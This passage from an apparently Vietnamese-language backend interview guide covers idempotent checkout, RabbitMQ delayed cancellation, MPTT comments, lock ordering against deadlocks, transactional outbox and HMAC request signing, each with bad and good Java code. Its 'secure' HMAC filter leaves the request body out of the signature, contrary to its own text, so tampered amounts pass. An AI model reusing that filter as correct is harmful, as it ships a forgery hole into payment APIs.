public ResponseEntity<?> checkout(@RequestBody CheckoutRequest req) {
    // ❌ KHÔNG CÓ CƠ CHẾ IDEMPOTENCY:
    // Nếu mạng lag hoặc người dùng spam click đúp, 2 request đến cùng lúc
    // sẽ tạo ra 2 giao dịch ngân hàng và trừ tiền 2 lần!
    PaymentResult result = paymentGateway.charge(req.getCardToken(), req.getAmount());
    Order order = orderService.createOrder(req, result.getTransactionId());
    return ResponseEntity.ok(order);
}`,
        goodCodeTitle: '✅ Idempotency Handler với Redis SETNX & Result Cache',
        goodCode: `@PostMapping("/orders/checkout")
public ResponseEntity<?> checkout(
        @RequestHeader("x-idempotency-key") String idempotencyKey,
        @RequestBody CheckoutRequest req) {

    String cacheKey = "idem:result:" + idempotencyKey;
    String lockKey = "idem:lock:" + idempotencyKey;

    // 1. Nếu đã có kết quả lần trước, trả về ngay lập tức (Idempotent Replay):
    String cachedResponse = redisTemplate.opsForValue().get(cacheKey);
    if (cachedResponse != null) {
        return ResponseEntity.ok()
                .header("X-Idempotent-Replayed", "true")
                .body(cachedResponse);
    }

    // 2. Chiếm khóa tạm thời (TTL 120s) để tránh 2 request cùng chạy song song:
    Boolean acquired = redisTemplate.opsForValue().setIfAbsent(lockKey, "PROCESSING", Duration.ofSeconds(120));
    if (Boolean.FALSE.equals(acquired)) {
        return ResponseEntity.status(HttpStatus.CONFLICT)
                .body("Yêu cầu của bạn đang được xử lý, vui lòng không nhấn liên tục!");
    }

    try {
        // 3. Thực thi nghiệp vụ thanh toán:
        PaymentResult result = paymentGateway.charge(req.getCardToken(), req.getAmount());
        Order order = orderService.createOrder(req, result.getTransactionId());

        // 4. Cache lại kết quả trong 24h:
        String jsonResult = objectMapper.writeValueAsString(order);
        redisTemplate.opsForValue().set(cacheKey, jsonResult, Duration.ofHours(24));

        return ResponseEntity.ok(order);
    } finally {
        // 5. Giải phóng lock:
        redisTemplate.delete(lockKey);
    }
}`,
        interviewTip: 'Tech Lead sẽ hỏi: "Nếu request đầu tiên bị lỗi 500 giữa chừng (chưa trừ tiền) thì request retry tiếp theo có được chạy không?". Trả lời chuẩn: "Chỉ cache kết quả khi trạng thái cuối cùng là rõ ràng (SUCCESS hoặc FAILED do nghiệp vụ như thẻ hết hạn). Nếu lỗi hệ thống 500 do rớt mạng hoặc DB crash, ta KHÔNG cache kết quả lỗi đó và giải phóng lock ngay trong khối finally/catch để request retry được phép thực thi lại".'
      },
      {
        id: 'delay-queue-auto-cancel',
        title: '3. Delay Queue & Tự Động Hủy Đơn Hàng Quá Hạn: Cạm Bẫy Cron Job',
        badge: 'Tối Ưu Tài Nguyên Hệ Thống',
        summary: 'Khách đặt hàng sau 15 phút không trả tiền phải tự động hủy và hoàn kho. Tuyệt đối không dùng Cron Job quét full table. Dùng RabbitMQ DLX hoặc Redis ZSET.',
        explanation: `Trong các sàn thương mại điện tử (Shopee, Tiki), khi khách đặt đơn, hàng trong kho sẽ bị tạm giữ (Hold). Nếu sau 15-30 phút khách không thanh toán, hệ thống phải **tự động hủy đơn và nhả tồn kho** cho khách khác mua.

**Tại sao dùng Cron Job \`@Scheduled\` quét Database là một thảm họa?**
\`SELECT * FROM orders WHERE status = 'PENDING' AND created_at < NOW() - INTERVAL 15 MINUTE;\`
- **Full Table Scan & Nặng nề:** Khi bảng có 10 triệu dòng, câu lệnh này sẽ quét hàng loạt trang đĩa, gây nghẽn I/O và khóa bảng.
- **Độ trễ không chuẩn xác:** Nếu Cron chạy mỗi 5 phút một lần, một đơn quá hạn lúc 10:01 có thể phải chờ đến 10:05 mới bị hủy ➔ Người mua khác bị mất cơ hội mua hàng.
- **Trùng lặp đa instance:** Khi scale 5 Pod Spring Boot, nếu không có Distributed Lock cho Job, cả 5 Pod sẽ cùng lúc chạy cron quét trùng đơn hàng.

**2 Giải pháp chuẩn công nghiệp từ:**

1. **Giải pháp 1: RabbitMQ Dead Letter Exchange (DLX) + Message TTL (Khuyên dùng):**
   - Tạo một \`order.delay.queue\` không có Consumer nào lắng nghe, cài đặt \`x-message-ttl = 900,000ms\` (15 phút) và liên kết với Dead Letter Exchange (\`order.cancel.dlx\`).
   - Khi tạo đơn, Producer gửi message vào \`order.delay.queue\`.
   - Đúng 15 phút sau, message hết hạn tự động bị đẩy sang \`order.cancel.dlx\` và rơi vào \`order.cancel.queue\`.
   - Consumer lắng nghe \`order.cancel.queue\`, kiểm tra trạng thái đơn: nếu vẫn chưa thanh toán thì cập nhật hủy đơn và hoàn kho.
   - **Ưu điểm:** Cực kỳ bền vững, zero-polling CPU, chính xác từng mili-giây!

2. **Giải pháp 2: Redis Sorted Set (ZSET) Delayed Scheduler:**
   - Dùng lệnh: \`ZADD order_delay_queue <timestamp_hết_hạn> <order_id>\`.
   - Một worker định kỳ chạy: \`ZRANGEBYSCORE order_delay_queue 0 <current_timestamp> LIMIT 0 100\`.
   - Lấy các đơn quá hạn ra hủy và dùng \`ZREM\` xóa khỏi hàng đợi.
   - **Ưu điểm:** Dễ hủy delay task nếu khách thanh toán thành công trước hạn (chỉ cần gọi \`ZREM order_delay_queue orderId\`).`,
        asciiDiagram: `[RabbitMQ Delay Queue Architecture]
Order Service ──(Gửi Msg + TTL 15 phút)──> [Queue: order.delay.queue]
                                                    │
                                                    │ (Không có Consumer, tin nhắn nằm chờ 15 phút)
                                                    │
                                                    ▼ (Hết hạn TTL 15m)
                                           [Exchange: order.dlx]
                                                    │
                                                    ▼
                                           [Queue: order.cancel.queue]
                                                    │
                                                    ▼
                                           [Cancel Worker Service]
                                           1. Check order.isPaid?
                                           2. If NO ➔ HỦY ĐƠN & HOÀN KHO! ✅`,
        badCodeTitle: '❌ Dùng Cron Job quét full table định kỳ',
        badCode: `// ❌ THẢM HỌA PRODUCTION: Quét hàng triệu bản ghi mỗi 60 giây!
@Scheduled(fixedRate = 60000)
public void autoCancelOrdersJob() {
    LocalDateTime threshold = LocalDateTime.now().minusMinutes(15);
    // Quét toàn bộ DB -> Gây Slow Query, CPU tăng 100% và lock bảng!
    List<Order> expiredOrders = orderRepository.findByStatusAndCreatedAtBefore("PENDING", threshold);
    for (Order order : expiredOrders) {
        order.setStatus("CANCELLED");
        inventoryService.restoreStock(order.getProductId(), order.getQuantity());
        orderRepository.save(order);
    }
}`,
        goodCodeTitle: '✅ RabbitMQ DLX cấu hình trong Spring Boot',
        goodCode: `@Configuration
public class RabbitDelayConfig {
    // 1. Queue chứa tin nhắn chờ (TTL 15 phút, không có listener):
    @Bean
    public Queue orderDelayQueue() {
        return QueueBuilder.durable("order.delay.queue")
                .withArgument("x-message-ttl", 15 * 60 * 1000) // 15 phút
                .withArgument("x-dead-letter-exchange", "order.cancel.dlx")
                .withArgument("x-dead-letter-routing-key", "order.cancel.key")
                .build();
    }

    // 2. Dead Letter Exchange tiếp nhận tin nhắn quá hạn:
    @Bean
    public DirectExchange orderCancelExchange() {
        return new DirectExchange("order.cancel.dlx");
    }

    // 3. Queue thực sự xử lý hủy đơn:
    @Bean
    public Queue orderCancelQueue() {
        return QueueBuilder.durable("order.cancel.process.queue").build();
    }

    @Bean
    public Binding cancelBinding() {
        return BindingBuilder.bind(orderCancelQueue())
                .to(orderCancelExchange())
                .with("order.cancel.key");
    }
}

// Consumer chỉ lắng nghe queue hủy khi message đã 'chín' đúng 15 phút:
@Component
@RequiredArgsConstructor
public class OrderCancelConsumer {
    private final OrderRepository orderRepository;
    private final InventoryService inventoryService;

    @RabbitListener(queues = "order.cancel.process.queue")
    @Transactional
    public void processCancel(Long orderId) {
        Order order = orderRepository.findById(orderId).orElse(null);
        if (order != null && "PENDING".equals(order.getStatus())) {
            order.setStatus("CANCELLED_TIMEOUT");
            inventoryService.restoreStock(order.getProductId(), order.getQuantity());
            orderRepository.save(order);
            log.info("Đã tự động hủy đơn do quá hạn thanh toán 15p: orderId={}", orderId);
        }
    }
}`,
        interviewTip: 'Phỏng vấn hỏi: "Nếu khách thanh toán vào phút thứ 14 thì sao?". Trả lời: "1. Ở luồng thanh toán thành công, cập nhật trạng thái đơn thành PAID. 2. Khi message TTL 15 phút rơi vào Cancel Worker ở phút thứ 15, worker kiểm tra: nếu status == PAID thì đơn giản là ACK bỏ qua message, không làm gì cả. Hệ thống đảm bảo Idempotent tuyệt đối!"'
      },
      {
        id: 'nested-comments-mptt',
        title: '4. Nested Comments (MPTT Tree): Tối Ưu Bình Luận Đa Tầng Về 1 Câu SQL',
        badge: 'Thuật Toán Hệ Thống Thực Chiến',
        summary: 'Bình luận lồng nhau như Facebook/Reddit. Dùng parent_id (Adjacency List) phải đệ quy N+1 hoặc CTE nặng nề. Dùng Modified Preorder Tree Traversal (MPTT) chỉ mất 1 câu SELECT.',
        explanation: `Hệ thống bình luận lồng nhau đa tầng (Nested / Hierarchical Comments) là tính năng kinh điển của các mạng xã hội (Facebook, Reddit, YouTube).
Một comment cha có thể có nhiều comment con, và mỗi con lại có nhiều cháu chắt...

**1. Điểm yếu chết người của Adjacency List (\`parent_id\`):**
- Đa số sinh viên thiết kế bảng: \`Comment(id, post_id, parent_id, content)\`.
- Để lấy toàn bộ cây bình luận của một bài viết:
  - Hoặc dùng vòng lặp đệ quy trong mã Java ➔ **Bị N+1 Query**, một bài có 100 comment là gọi 100 câu query xuống DB!
  - Hoặc dùng Recursive CTE (\`WITH RECURSIVE\`) trong SQL ➔ Database tốn rất nhiều CPU tính toán đồ thị đệ quy, khi cây sâu hơn 5 tầng thì cực kỳ chậm.

**2. Giải pháp tối thượng: Modified Preorder Tree Traversal (MPTT / Nested Sets Model):**
- Mỗi node trong cây được gán 2 chỉ số: **\`comment_left\`** và **\`comment_right\`**.
- Quy tắc duyệt tiền thứ tự (Preorder Traversal):
  - Đi từ trên xuống dưới, từ trái sang phải.
  - Đi vào một node thì đánh số \`left\`, đi ra khỏi node thì đánh số \`right\`.
  - **Tất cả các node con cháu của một comment luôn có:**
    \`comment_left > parent.comment_left AND comment_right < parent.comment_right\`.

**Sức mạnh vượt trội của MPTT:**
- **Lấy toàn bộ cây con của 1 comment:** Chỉ cần **1 CÂU SELECT DUY NHẤT**:
  \`SELECT * FROM comments WHERE comment_left > ? AND comment_right < ? ORDER BY comment_left ASC;\`
- **Tính toán số lượng con cháu:** Đơn giản bằng công thức: \`(right - left - 1) / 2\` mà không cần đếm (\`COUNT\`)!
- **Xóa một nhánh bình luận:** Chỉ cần 1 câu DELETE: \`DELETE FROM comments WHERE comment_left >= ? AND comment_right <= ?;\`.`,
        asciiDiagram: `[Mô hình Cây MPTT với Left và Right]
                     1 [Gốc: Bài Viết] 12
                             │
            ┌────────────────┴────────────────┐
            ▼                                 ▼
      2 [Comment A] 7                   8 [Comment B] 11
            │                                 │
      ┌─────┴─────┐                           ▼
      ▼           ▼                     9 [Reply B1] 10
3 [Reply A1] 4  5 [Reply A2] 6

* Để lấy toàn bộ nhánh của Comment A (left=2, right=7):
  SELECT * FROM comments WHERE left > 2 AND right < 7 ORDER BY left;
  -> Trả về ngay lập tức: [Reply A1, Reply A2] chỉ trong 1 câu query O(1)!`,
        badCodeTitle: '❌ Dùng parent_id đệ quy N+1 trong Java',
        badCode: `// ❌ N+1 QUERY KINH ĐIỂN:
public CommentResponse getCommentsRecursive(Long commentId) {
    Comment comment = commentRepo.findById(commentId).orElseThrow();
    // Mỗi comment con lại phát sinh thêm 1 câu SELECT:
    List<Comment> children = commentRepo.findByParentId(commentId);
    List<CommentResponse> childResponses = new ArrayList<>();
    for (Comment child : children) {
        childResponses.add(getCommentsRecursive(child.getId())); // Đệ quy sâu làm nát DB!
    }
    return new CommentResponse(comment, childResponses);
}`,
        goodCodeTitle: '✅ MPTT Entity và Query 1 phát lấy trọn cây con',
        goodCode: `@Entity
@Table(name = "comments", indexes = {
    @Index(name = "idx_post_left_right", columnList = "postId, commentLeft, commentRight")
})
@Getter @Setter
public class Comment {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private Long postId;
    private String content;

    // 2 cột phép màu của MPTT:
    private int commentLeft;
    private int commentRight;
    private Long parentId;
}

public interface CommentRepository extends JpaRepository<Comment, Long> {
    // ✅ 1 CÂU QUERY DUY NHẤT LẤY TOÀN BỘ CÂY CON:
    @Query("""
        SELECT c FROM Comment c 
        WHERE c.postId = :postId 
          AND c.commentLeft > :parentLeft 
          AND c.commentRight < :parentRight 
        ORDER BY c.commentLeft ASC
    """)
    List<Comment> findAllChildrenOfNode(
            @Param("postId") Long postId,
            @Param("parentLeft") int parentLeft,
            @Param("parentRight") int parentRight
    );
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Nhược điểm lớn nhất của mô hình MPTT là gì?", hãy trả lời thành thật: "MPTT tối ưu tuyệt đối cho ĐỌC (95% hệ thống mạng xã hội là đọc bình luận), nhưng thao tác GHI (chèn comment mới) sẽ tốn kém hơn vì ta phải chạy câu lệnh UPDATE tăng +2 cho toàn bộ các node có left/right nằm phía bên phải node vừa chèn. Do đó nếu hệ thống có tần suất ghi cực lớn (ví dụ chat realtime), ta nên cân nhắc Adjacency List kết hợp Redis hoặc Closure Table".'
      },
      {
        id: 'banking-deadlock-ordering',
        title: '5. Xử Lý Deadlock Trong Chuyển Tiền Ngân Hàng Bằng Consistent Lock Ordering',
        badge: 'Nguyên Lý Cốt Lõi Ngân Hàng',
        summary: 'User A chuyển tiền cho B, cùng lúc B chuyển cho A. Hai transaction khóa 2 tài khoản ngược thứ tự gây Deadlock. Giải quyết triệt để bằng cách luôn khóa tài khoản có ID nhỏ hơn trước.',
        explanation: `Trong các bài phỏng vấn Backend Senior hoặc ngân hàng số (Fintech), bài toán chuyển khoản giữa 2 tài khoản là câu hỏi thường trực:
*Làm thế nào để chuyển tiền từ Tài khoản A sang Tài khoản B một cách an toàn mà không bao giờ bị Deadlock?*

**1. Kịch bản Deadlock kinh điển:**
Giả sử có 2 giao dịch diễn ra đồng thời tại cùng một tích tắc:
- **Giao dịch 1:** User 10 chuyển tiền cho User 20.
  - Bước 1: Khóa tài khoản 10 (\`SELECT ... FOR UPDATE WHERE id = 10\`) ➔ Thành công.
  - Bước 2: Chuẩn bị khóa tài khoản 20...
- **Giao dịch 2:** User 20 chuyển tiền cho User 10.
  - Bước 1: Khóa tài khoản 20 (\`SELECT ... FOR UPDATE WHERE id = 20\`) ➔ Thành công.
  - Bước 2: Chuẩn bị khóa tài khoản 10...
- **KẾT CỤC:**
  - Giao dịch 1 đang giữ khóa 10, chờ khóa 20.
  - Giao dịch 2 đang giữ khóa 20, chờ khóa 10.
  - ➔ Hai bên chờ nhau vô tận tạo thành **Vòng lặp chờ tài nguyên (Circular Wait)**.
  - Database phát hiện sau vài giây và ném lỗi: \`ERROR: deadlock detected (SQLState 40P01)\` và tự động abort 1 trong 2 transaction!

**2. Bốn điều kiện Coffman sinh ra Deadlock:**
1. Mutual Exclusion (Loại trừ tương hỗ).
2. Hold and Wait (Giữ tài nguyên và chờ tài nguyên khác).
3. No Preemption (Không thể cướp tài nguyên của luồng khác).
4. **Circular Wait (Chờ đợi vòng tròn).**

**3. Giải pháp triệt để: Consistent Lock Ordering (Sắp xếp thứ tự khóa)**
Ta không thể bỏ 3 điều kiện đầu vì cần đảm bảo ACID, nhưng ta có thể **BẺ GÃY HOÀN TOÀN ĐIỀU KIỆN SỐ 4 (Circular Wait)**!
- **Quy tắc vàng:** Bất kể ai là người gửi, ai là người nhận, ta **LUÔN LUÔN KHÓA TÀI KHOẢN CÓ ID NHỎ HƠN TRƯỚC, VÀ KHÓA TÀI KHOẢN CÓ ID LỚN HƠN SAU!**
- Áp dụng vào kịch bản trên:
  - Cả Giao dịch 1 (10->20) và Giao dịch 2 (20->10) đều sẽ **tranh chấp khóa tài khoản 10 trước**!
  - Ai chiếm được khóa 10 sẽ đi tiếp và chiếm khóa 20. Người còn lại phải đứng chờ ở ngay vạch xuất phát (chờ khóa 10).
  - Không có sự chờ đợi chéo nhau ➔ **Deadlock bị triệt tiêu 100% về mặt toán học!**`,
        asciiDiagram: `[KỊCH BẢN GÂY DEADLOCK (Khóa theo thứ tự From -> To)]
Giao dịch 1 (10 -> 20)           Giao dịch 2 (20 -> 10)
  Khóa Acc 10 [OK]                 Khóa Acc 20 [OK]
        │                                │
        ▼                                ▼
  Chờ Acc 20 ────────────────────────> Chờ Acc 10
        ▲                                │
        └────────────────────────────────┘  ===> DEADLOCK! 💥

[GIẢI PHÁP: CONSISTENT LOCK ORDERING (Luôn khóa min(from, to) trước)]
Cả 2 Giao dịch đều tuân thủ: Khóa Acc 10 trước -> Khóa Acc 20 sau!
Giao dịch 1: Chiếm Acc 10 [OK] -> Chiếm Acc 20 [OK] -> Hoàn tất! ✅
Giao dịch 2: Chờ Acc 10... (Xong GD 1 mới chạy)      -> Hoàn tất! ✅ (KHÔNG DEADLOCK)`,
        badCodeTitle: '❌ Khóa ngây thơ theo thứ tự Người gửi -> Người nhận',
        badCode: `@Transactional
public void transferMoney(Long fromId, Long toId, BigDecimal amount) {
    // ❌ CỰC KỲ DỄ DÍNH DEADLOCK:
    // Nếu có luồng khác chuyển toId -> fromId cùng lúc:
    Account from = accountRepo.findByIdForUpdate(fromId); // Lock fromId
    Account to = accountRepo.findByIdForUpdate(toId);     // Lock toId -> DEADLOCK!

    from.setBalance(from.getBalance().subtract(amount));
    to.setBalance(to.getBalance().add(amount));
}`,
        goodCodeTitle: '✅ Sắp xếp thứ tự ID trước khi chiếm khóa',
        goodCode: `@Transactional
public void transferMoneySafe(Long fromId, Long toId, BigDecimal amount) {
    if (fromId.equals(toId)) {
        throw new IllegalArgumentException("Không thể chuyển tiền cho chính mình");
    }

    // ✅ BẺ GÃY CIRCULAR WAIT: Luôn xác định ID nhỏ hơn để khóa trước:
    Long firstId = fromId < toId ? fromId : toId;
    Long secondId = fromId < toId ? toId : fromId;

    // Chiếm khóa theo thứ tự nhất quán 100%:
    Account firstLocked = accountRepo.findByIdForUpdate(firstId);
    Account secondLocked = accountRepo.findByIdForUpdate(secondId);

    // Xác định đúng ai là người gửi, ai là người nhận:
    Account from = fromId.equals(firstId) ? firstLocked : secondLocked;
    Account to = toId.equals(firstId) ? firstLocked : secondLocked;

    if (from.getBalance().compareTo(amount) < 0) {
        throw new InsufficientBalanceException("Số dư không đủ");
    }

    from.setBalance(from.getBalance().subtract(amount));
    to.setBalance(to.getBalance().add(amount));
    log.info("Chuyển tiền thành công từ {} sang {} số tiền {}", fromId, toId, amount);
}`,
        interviewTip: 'Khi phỏng vấn viên hỏi: "Ngoài sắp xếp thứ tự khóa trong DB, còn cách nào khác để xử lý chuyển tiền trong hệ thống phân tán microservices?", hãy trả lời: "Dùng mô hình Distributed SAGA với Orchestrator và Compensating Transaction, hoặc gom các sự kiện chuyển tiền vào Kafka Partition với Partition Key là Account ID để chuyển đổi bài toán đa luồng thành đơn luồng (Single-threaded FIFO processing per account) như kiến trúc của LMAX Disruptor".'
      },
      {
        id: 'saga-transactional-outbox',
        title: '6. SAGA Pattern & Transactional Outbox: Nhất Quán Giao Dịch Phân Tán',
        badge: 'Kiến Trúc Microservices Chuẩn',
        summary: 'Không thể dùng @Transactional của Spring xuyên suốt nhiều microservices. Dùng SAGA bù trừ (Compensating) kết hợp Transactional Outbox để không bao giờ mất event.',
        explanation: `Trong kiến trúc Monolith, việc đảm bảo tính toàn vẹn dữ liệu rất đơn giản: chỉ cần gắn \`@Transactional\` là toàn bộ thao tác SQL đều nằm trong 1 ACID Transaction duy nhất.
Nhưng khi chuyển sang **Microservices**, mỗi service sở hữu một Database riêng biệt:
- **Order Service** ghi vào PostgreSQL (Database 1).
- **Payment Service** ghi vào MySQL (Database 2).
- **Inventory Service** ghi vào MongoDB (Database 3).

**1. Thảm họa Hai Pha Commit (2PC - Two-Phase Commit):**
- Giao thức 2PC cổ điển yêu cầu khóa tài nguyên trên tất cả database cho đến khi toàn bộ các node đồng ý commit.
- **Hậu quả:** Cực kỳ chậm, làm giảm 90% throughput và biến toàn bộ hệ thống thành một điểm nghẽn chịu lỗi (Single Point of Failure). Big Tech cấm dùng 2PC trên Microservices!

**2. Giải pháp SAGA Pattern (Tính nhất quán sau cùng - Eventual Consistency):**
- SAGA chia một giao dịch lớn thành chuỗi các **Local Transactions** kế tiếp nhau.
- Mỗi local transaction cập nhật DB của service đó và phát ra một Event để kích hoạt service tiếp theo.
- **Compensating Transaction (Giao dịch hoàn tác/bù trừ):** Nếu một bước gặp lỗi (ví dụ Payment trừ tiền thành công nhưng Inventory báo hết hàng), SAGA sẽ kích hoạt một chuỗi các bước bù trừ ngược lại: hoàn lại tiền vào tài khoản khách!

**3. Hiểm họa Dual-Write Trap & Transactional Outbox Pattern:**
- **Cạm bẫy Dual-Write:** Service vừa ghi dữ liệu vào DB, vừa bắn message lên Kafka. Nếu ghi DB xong mà mạng lag không gửi được Kafka ➔ Dữ liệu bị lệch vĩnh viễn giữa 2 service!
- **Giải pháp Transactional Outbox:**
  - Tạo một bảng **\`outbox_events\`** nằm ngay trong cùng Database của Order Service.
  - Khi tạo đơn hàng, ghi đồng thời cả \`Order\` và \`OutboxEvent\` vào trong **CÙNG 1 LOCAL TRANSACTION**! Đảm bảo 100% hoặc cả 2 cùng thành công, hoặc cả 2 cùng rollback.
  - Một tiến trình chuyên dụng (Debezium đọc CDC binlog của MySQL/Postgres, hoặc Poller ngầm) sẽ đọc từ bảng \`outbox_events\` và bắn lên Kafka với cam kết **At-Least-Once Delivery**.` ,
        asciiDiagram: `[HIỂM HỌA DUAL-WRITE TRAP]
Service ──(1. Ghi Database)──> [PostgreSQL: OK]
   │
   └──(2. Bắn Kafka)─────────> ❌ Mạng rớt / Service crash ➔ MẤT SỰ KIỆN VĨNH VIỄN!

[GIẢI PHÁP: TRANSACTIONAL OUTBOX PATTERN]
Service ──(CÙNG 1 LOCAL ACID TRANSACTION)──┐
                                           ├─> [Bảng: orders]
                                           └─> [Bảng: outbox_events]
                                                      │
                                                      ▼ (Đọc CDC Binlog hoặc Poller)
                                             [Debezium / Outbox Worker]
                                                      │
                                                      ▼ (Cam kết At-Least-Once)
                                              [Kafka Topic: order-created]`,
        badCodeTitle: '❌ Dual-Write ngây thơ gây mất mát dữ liệu phân tán',
        badCode: `@Transactional
public void placeOrder(OrderRequest req) {
    // 1. Ghi Database thành công:
    Order order = orderRepo.save(new Order(req));

    // ❌ CẠM BẪY DUAL-WRITE:
    // Nếu kafkaTemplate.send() bị timeout mạng hoặc pod bị OOMKilled ngay lúc này:
    // Order đã lưu vào DB nhưng Payment Service không bao giờ nhận được event!
    kafkaTemplate.send("order-created-topic", new OrderCreatedEvent(order.getId()));
}`,
        goodCodeTitle: '✅ Transactional Outbox ghi chung transaction với nghiệp vụ',
        goodCode: `@Service
@RequiredArgsConstructor
public class OrderService {
    private final OrderRepository orderRepo;
    private final OutboxRepository outboxRepo;

    @Transactional
    public Order placeOrderSafe(OrderRequest req) {
        // 1. Lưu Order vào bảng nghiệp vụ:
        Order order = orderRepo.save(new Order(req));

        // 2. Lưu Event vào bảng outbox_events TRONG CÙNG 1 TRANSACTION:
        OutboxEvent event = new OutboxEvent(
                "ORDER_SERVICE",
                "OrderCreated",
                order.getId().toString(),
                objectMapper.writeValueAsString(new OrderCreatedEvent(order.getId())),
                "PENDING"
        );
        outboxRepo.save(event);

        return order; // Commit cả 2 bảng cùng lúc 100% nguyên tử!
    }
}

// Worker ngầm quét bảng outbox bắn sang Kafka đảm bảo At-least-once:
@Component
@RequiredArgsConstructor
public class OutboxPublisher {
    private final OutboxRepository outboxRepo;
    private final KafkaTemplate<String, String> kafkaTemplate;

    @Scheduled(fixedDelay = 2000)
    public void publishPendingEvents() {
        List<OutboxEvent> pending = outboxRepo.findTop50ByStatusOrderByCreatedAtAsc("PENDING");
        for (OutboxEvent evt : pending) {
            kafkaTemplate.send("order-created-topic", evt.getAggregateId(), evt.getPayload())
                .whenComplete((res, ex) -> {
                    if (ex == null) {
                        evt.setStatus("SENT");
                        outboxRepo.save(evt);
                    }
                });
        }
    }
}`,
        interviewTip: 'So sánh SAGA Choreography vs Orchestration: "Choreography phù hợp hệ thống nhỏ, ít bước (2-4 services), các service giao tiếp trực tiếp qua Event, không cần bộ điều phối trung tâm nhưng khó theo dõi luồng khi hệ thống phình to. Orchestration phù hợp hệ thống phức tạp (5+ services như luồng đặt vé máy bay), có một Service Orchestrator điều khiển trạng thái tập trung và kích hoạt transaction bù trừ rõ ràng".'
      },
      {
        id: 'api-security-hmac',
        title: '7. API Security: Chống Giả Mạo & Replay Attack Bằng HMAC-SHA256',
        badge: 'Bảo Mật Cấp Ngân Hàng',
        summary: 'Cách các ngân hàng và sàn TMĐT bảo vệ Open API: Cặp API Key/Secret, Timestamp (chống trễ 5p), Nonce lưu Redis (chống replay) và chữ ký HMAC-SHA256.',
        explanation: `Khi xây dựng Open API cho đối tác bên thứ 3 (Payment Gateway, ViettelPost, Giao Hàng Nhanh), việc chỉ sử dụng Token tĩnh hoặc mật khẩu là cực kỳ rủi ro:
- **Tấn công nghe lén (Sniffing):** Kẻ tấn công bắt được gói tin HTTP.
- **Tấn công phát lại (Replay Attack):** Hacker lấy nguyên vẹn gói tin vừa bắt được và phát lại (curl lặp lại) 1,000 lần để trừ tiền hoặc tạo đơn ảo.
- **Giả mạo dữ liệu (Tampering):** Hacker sửa trường \`amount: 1000000\` thành \`amount: 1000\` trước khi gửi đến Server.

**Bộ tứ vệ thần bảo vệ API chuẩn Quốc Tế:**
1. **\`x-api-key\` (Public Identifier):** Định danh Client/Đối tác đang gọi API là ai.
2. **\`x-timestamp\` (Thời điểm gửi):** Server chỉ chấp nhận request nếu \`abs(server_time - client_time) <= 300 giây\` (5 phút). Chống hacker lưu gói tin lại nhiều ngày sau mới phát.
3. **\`x-nonce\` (Number used Once):** Một chuỗi ngẫu nhiên duy nhất cho mỗi request (UUID). Server lưu Nonce vào Redis với TTL 5 phút. Nếu phát hiện Nonce đã tồn tại ➔ **Từ chối ngay lập tức vì đây là Replay Attack!**
4. **\`x-signature\` (Chữ ký số bí mật):**
   - Client tính toán chữ ký số bằng thuật toán HMAC-SHA256:
     \`signature = HMAC_SHA256(secret_key, method + path + timestamp + nonce + body)\`
   - **Secret Key KHÔNG BAO GIỜ được gửi qua mạng!** Chỉ có Client và Server nắm giữ.
   - Server nhận request, tự tính lại signature theo công thức trên: nếu khớp thì dữ liệu 100% nguyên bản chưa bị sửa đổi!`,
        asciiDiagram: `[CLIENT] ───────────────────────────────────────────────────────────> [SERVER]
Headers gửi kèm:
• x-api-key: "client_pub_99"
• x-timestamp: "1720001000"
• x-nonce: "uuid_a1b2c3d4"
• x-signature: HMAC(secret, POST + /pay + ts + nonce + body)

                          BƯỚC 1: Tìm Secret Key theo x-api-key
                                       │
                          BƯỚC 2: Kiểm tra Timestamp: |Now - ts| <= 300s?
                                       │
                          BƯỚC 3: Redis SETNX "nonce:uuid_a1b2c3d4" 1 EX 300
                                  (Nếu false ➔ BỊ REPLAY ATTACK! Chặn ngay ❌)
                                       │
                          BƯỚC 4: Server tự băm HMAC-SHA256 kiểm tra signature
                                  (Khớp ➔ CHO PHÉP XỬ LÝ ✅)`,
        badCodeTitle: '❌ Tin tưởng Header tĩnh không có cơ chế chống Replay',
        badCode: `// ❌ BẢO MẬT NGÂY THƠ:
@PostMapping("/api/v1/payment/callback")
public ResponseEntity<?> handleCallback(
        @RequestHeader("Authorization") String token,
        @RequestBody PaymentCallback body) {
    // Chỉ kiểm tra chuỗi token cố định:
    if (!"SECRET_TOKEN_123".equals(token)) {
        return ResponseEntity.status(401).build();
    }
    // Hacker chỉ cần bắt trộm gói tin này 1 lần là có thể replay 1,000 lần
    // để cộng tiền vào tài khoản không giới hạn!
    walletService.addBalance(body.getUserId(), body.getAmount());
    return ResponseEntity.ok().build();
}`,
        goodCodeTitle: '✅ Spring Filter xác thực HMAC-SHA256 + Redis Nonce',
        goodCode: `@Component
@RequiredArgsConstructor
public class HmacSecurityFilter extends OncePerRequestFilter {
    private final StringRedisTemplate redisTemplate;
    private final ClientCredentialsService credentialsService;

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)
            throws ServletException, IOException {

        String apiKey = req.getHeader("x-api-key");
        String timestampStr = req.getHeader("x-timestamp");
        String nonce = req.getHeader("x-nonce");
        String clientSignature = req.getHeader("x-signature");

        if (apiKey == null || timestampStr == null || nonce == null || clientSignature == null) {
            res.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Thiếu header bảo mật bắt buộc");
            return;
        }

        // 1. Kiểm tra Timestamp: Không lệch quá 5 phút:
        long timestamp = Long.parseLong(timestampStr);
        long now = Instant.now().getEpochSecond();
        if (Math.abs(now - timestamp) > 300) {
            res.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Request đã hết hạn (Timestamp expired)");
            return;
        }

        // 2. Chống Replay Attack bằng Redis Nonce (TTL 5 phút):
        Boolean isNewNonce = redisTemplate.opsForValue().setIfAbsent("nonce:" + nonce, "1", Duration.ofMinutes(5));
        if (Boolean.FALSE.equals(isNewNonce)) {
            res.sendError(HttpServletResponse.SC_CONFLICT, "Phát hiện tấn công phát lại (Replay Attack detected)");
            return;
        }

        // 3. Tính toán lại HMAC Signature với Secret Key lưu an toàn:
        String secretKey = credentialsService.getSecretKey(apiKey);
        String payloadToSign = req.getMethod() + req.getRequestURI() + timestampStr + nonce;
        String expectedSignature = HmacUtils.hmacSha256Hex(secretKey, payloadToSign);

        if (!MessageDigest.isEqual(expectedSignature.getBytes(), clientSignature.getBytes())) {
            res.sendError(HttpServletResponse.SC_FORBIDDEN, "Chữ ký số không hợp lệ (Signature mismatch)");
            return;
        }

        chain.doFilter(req, res); // Xác thực thành công!
    }
}`,
